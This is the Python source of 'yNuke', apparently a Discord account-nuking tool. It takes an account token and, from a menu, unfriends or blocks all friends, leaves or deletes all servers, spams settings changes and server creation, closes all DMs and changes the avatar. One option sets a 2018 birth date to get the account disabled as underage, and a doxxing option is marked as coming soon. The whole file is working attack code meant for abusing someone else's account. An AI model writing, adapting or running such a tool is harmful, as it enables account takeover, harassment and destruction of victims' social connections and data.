import requests
from colorama import Fore
import pyperclip
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import time
import os
import sys
import json
import base64
clear = lambda: os.system('cls')
clear()
start = """
██╗   ██╗
╚██╗ ██╔╝
 ╚████╔╝
  ╚██╔╝
   ██║
   ╚═╝
"""
version = "0.1"
def banner():
    sys.stdout.buffer.write(f'''\
{Fore.LIGHTRED_EX}
                                ██╗   ██╗███╗  ██╗██╗   ██╗██╗  ██╗███████╗
                                ╚██╗ ██╔╝████╗ ██║██║   ██║██║ ██╔╝██╔════╝        yNuke Version: {Fore.WHITE}{version}{Fore.LIGHTRED_EX}
                                 ╚████╔╝ ██╔██╗██║██║   ██║█████═╝ █████╗      Made by: {Fore.WHITE}YeetDisDude#0001{Fore.LIGHTRED_EX}
                account           ╚██╔╝  ██║╚████║██║   ██║██╔═██╗ ██╔══╝  
                    nuker          ██║   ██║ ╚███║╚██████╔╝██║ ╚██╗███████╗
                                   ╚═╝   ╚═╝  ╚══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{Fore.RESET}    
'''.encode('utf8'))

config = json.load(open("config.json", "r"))

toxxmsg = config["toxxmsg"]
servername = config["servername"]
serverprofile = config["serverprofile"]
profile = config["profile"]

if os.path.isfile(serverprofile) is True: #change serverprofile png to base64
        with open(serverprofile, "rb") as f:
            serverprofile = "data:image/png;base64," + base64.b64encode(f.read()).decode("ascii")
            f.close()

if os.path.isfile(profile) is True: #change profile png to base64
        with open(profile, "rb") as g:
            profile = "data:image/png;base64," + base64.b64encode(g.read()).decode("ascii")
            f.close()

Anime.Fade(Center.Center(start), Colors.red_to_yellow, Colorate.Vertical, interval=0.1, time=1)

token = input(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} Enter a token:\n")

checktokenheader = {"authorization": token}
headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"}

checktoken = requests.get('https://discord.com/api/v6/auth/login', headers=checktokenheader)


if checktoken:
    tokeninfo = requests.get("https://canary.discord.com/api/v9/users/@me", headers=checktokenheader).json()
    username = tokeninfo["username"]
    tag = tokeninfo["discriminator"]
    id = tokeninfo["id"]
    clear()
    while True:
        banner()
        menu = input(f"""                               {Fore.WHITE}yNuke {Fore.CYAN}| {Fore.WHITE}Logged in as {Fore.LIGHTRED_EX}{username}{Fore.RESET}#{Fore.LIGHTRED_EX}{tag}{Fore.RESET} {Fore.CYAN}| {Fore.RESET}{Fore.LIGHTRED_EX}{id}{Fore.RESET} 
{Fore.LIGHTRED_EX}[{Fore.WHITE}1{Fore.LIGHTRED_EX}] - {Fore.WHITE}Token Information
{Fore.LIGHTRED_EX}[{Fore.WHITE}2{Fore.LIGHTRED_EX}] - {Fore.WHITE}Get account friends
{Fore.LIGHTRED_EX}[{Fore.WHITE}3{Fore.LIGHTRED_EX}] - {Fore.WHITE}Unfriend all
{Fore.LIGHTRED_EX}[{Fore.WHITE}4{Fore.LIGHTRED_EX}] - {Fore.WHITE}Block all friends
{Fore.LIGHTRED_EX}[{Fore.WHITE}5{Fore.LIGHTRED_EX}] - {Fore.WHITE}Leave all guilds
{Fore.LIGHTRED_EX}[{Fore.WHITE}6{Fore.LIGHTRED_EX}] - {Fore.WHITE}Delete all guilds
{Fore.LIGHTRED_EX}[{Fore.WHITE}7{Fore.LIGHTRED_EX}] - {Fore.WHITE}Spam settings
{Fore.LIGHTRED_EX}[{Fore.WHITE}8{Fore.LIGHTRED_EX}] - {Fore.WHITE}Disable Token (may not work)
{Fore.LIGHTRED_EX}[{Fore.WHITE}9{Fore.LIGHTRED_EX}] - {Fore.WHITE}COMING SOON
{Fore.LIGHTRED_EX}[{Fore.WHITE}10{Fore.LIGHTRED_EX}] - {Fore.WHITE}Spam create servers
{Fore.LIGHTRED_EX}[{Fore.WHITE}11{Fore.LIGHTRED_EX}] - {Fore.WHITE}Close all DMs
{Fore.LIGHTRED_EX}[{Fore.WHITE}12{Fore.LIGHTRED_EX}] - {Fore.WHITE}Change Profile
{Fore.LIGHTRED_EX}[{Fore.WHITE}0{Fore.LIGHTRED_EX}] - {Fore.WHITE}Exit\n""")

        clear()
        if menu == "0":
            sys.exit()
        if menu == "1": #token info
            clear()
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"}
            tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
            print(f"{Fore.LIGHTCYAN_EX}Token Information")
            for key in tokeninfo:
                print(f"{Fore.LIGHTBLUE_EX}{key}: {Fore.LIGHTCYAN_EX}{tokeninfo[f'{key}']}")
            time.sleep(5)
            clear()

        if menu == "2": #scrape friends
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            r = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers)
            for friend in r.json():
                print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
            time.sleep(5)
            clear()

        if menu == "3": #remove all friends
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            unfriendall = requests.get("https://discord.com/api/v8/users/@me/relationships", headers=headers).json()
            for i in unfriendall:
                requests.delete(f"https://discord.com/api/v8/users/@me/relationships/{i['id']}", headers=headers,)
                print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Removed friend {Fore.LIGHTGREEN_EX}|{Fore.WHITE} {i['id']}")
            print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Removed all friends.")
            time.sleep(3)
            clear()

        if menu == "4": #block all friends
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            json = {"type": 2}
            blockfriends = requests.get("https://discord.com/api/v8/users/@me/relationships", headers=headers).json()
            for i in blockfriends:
                requests.put(f"https://discord.com/api/v8/users/@me/relationships/{i['id']}", headers=headers, json=json,)
                print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Blocked Friend {Fore.LIGHTCYAN_EX}|{Fore.RESET} {i['id']}")
                print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Blocked all friends.")
        
        if menu == "5": #leave all guilds
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            leaveallguilds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers).json()
            for guild in leaveallguilds:
                requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers=headers)
                print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Left guild {Fore.LIGHTRED_EX}{Fore.RESET}| {guild['id']}")
            print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Left all guilds.")
            time.sleep(3)

        if menu == "6": #delete all guilds
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            deleteguilds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
            for i in deleteguilds:
                requests.post(f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete", headers=headers,)
                print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Deleted guild {Fore.LIGHTGREEN_EX}| {Fore.RESET}{i['id']}")
            print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - {Fore.LIGHTGREEN_EX}Deleted All guilds.")
            time.sleep(3)
        
        if menu == "7": #settings spam
            print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Spamming settings")
            for i in range(0, 1000):
                headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
                condition_status = True
                payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
                condition_status = False
                payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
                requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
        
        if menu == "8": #disable account
            disabletokenjson = {"date_of_birth": "2018-7-21"}
            headers = {"authorization": token, "user-agent": "Mozilla/5.0"}
            for i in range(0, 1):
                payload = {"username": username, "discriminator": tag}
                changeage = requests.patch("https://discordapp.com/api/v6/users/@me", headers=headers,json=disabletokenjson)
                print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - User is now underaged")
                time.sleep(5)

        if menu == "9": #toxx account
            print("coming soon")
            time.sleep(5)
            clear()
        if menu == "10": #spam create servers
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            for count, i in enumerate(range(0, 100)):
                payload = {"name": servername, "icon": serverprofile}
                createserver = requests.post("https://discord.com/api/v9/guilds", headers=headers, json=payload)
        
        if menu == "11":
            headers = {"authorization": token, "user-agent": "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"}
            closealldms = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers).json()
            for channel in closealldms:
                requests.delete(f"https://discord.com/api/v8/channels/{channel['id']}", headers=headers,)
                print(f"{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - Closed dms. {Fore.LIGHTGREEN_EX}|{Fore.RESET} {channel['id']}")
            print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - {Fore.LIGHTGREEN_EX}Closed all DMs.")
            time.sleep(5)
            clear()

        if menu == "12": #change profile
            changeprofileurl = "https://discord.com/api/v9/users/@me"
            changeprofileheaders = {"authorization": token}
            payload = {"avatar": profile}
            changeprofile = requests.patch(url=changeprofileurl, headers=changeprofileheaders, json=payload)
            print(f"\n{Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}]{Fore.RESET} - {Fore.LIGHTGREEN_EX}Successfully Changed Profile.\n")
            time.sleep(3)
            clear()
        else:
            clear()
else:
    clear()
    print(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.RESET} - {Fore.LIGHTRED_EX}Invalid Token has been passed.{Fore.RESET}")


